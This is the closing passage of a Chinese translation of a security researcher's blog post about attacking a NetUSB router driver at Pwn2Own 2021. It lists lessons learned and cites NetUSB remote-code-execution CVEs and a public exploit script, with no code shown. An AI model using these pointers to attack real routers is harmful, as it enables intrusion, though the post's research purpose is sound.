从好的方面来说，我的队友都是真正的职业选手，并取得了他们的功绩，这真是太棒了🍾🏆。  
  
参加 Pwn2Own 一直是我的待办事项清单上最长的一次，所以看到它能够完成感觉很棒。在做的过程中我也吸取了很多教训：  
- 攻击内核可能很酷，但调试/设置环境绝对是痛苦的。如果我再做一次，我可能不会再走那条路。  
  
- 供应商在最后一刻修补错误可能会带来压力，而且真的不好玩。我的队友的第一个漏洞被更新杀死了，这很烦人。幸运的是，他们找到了另一个漏洞，并且这个漏洞仍然存在。  
  
- 尽快在设备上获取 root shell 是一个好主意。我最初尝试静态查找身份验证后漏洞来获取 root shell，但那是浪费时间。  
  
- Ghidra 反汇编器可以很好地反编译 MIPS32 代码。这并不完美，但却是积极的。  
  
- 后来我还意识到，相同的驱动程序正在 Netgear 路由器上运行，并且可以从 WAN 端口访问。我参与其中并不是为了钱，但也许对我来说更好的工作是更好地关注多个目标，而不是直接深入研究一个目标。  
  
- ZDI 团队非常棒。他们支持你并希望你获胜。不完全是。如果有问题，请随时与他们联系。  
  
- 更高的支出并不一定意味着更难的目标。  
  
- 您可以在zenith Github 存储库中找到所有代码和脚本。如果您想了解有关 NetUSB 的更多信息，这里还有一些参考资料：  
  
- CVE-2015-3036 - NetUSB 远程代码执行漏洞 (Linux/MIPS) -由bl4sty开发的blasty-vs-netusb.py  
  
- CVE-2021-45608 | maxpl0it发现数百万最终用户路由器中的 NetUSB RCE 缺陷  
  
我希望你喜欢这篇文章，我们下次再见😊！特别感谢我的朋友yrp604提出了这个标题，并再次感谢yrp604和__x86校对这篇文章🙏🏽。  
  
  
  
原文地址：  
  
https://doar-e.github.io/blog/2022/03/26/competing-in-pwn2own-2021-austin-icarus-at-the-zenith/  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
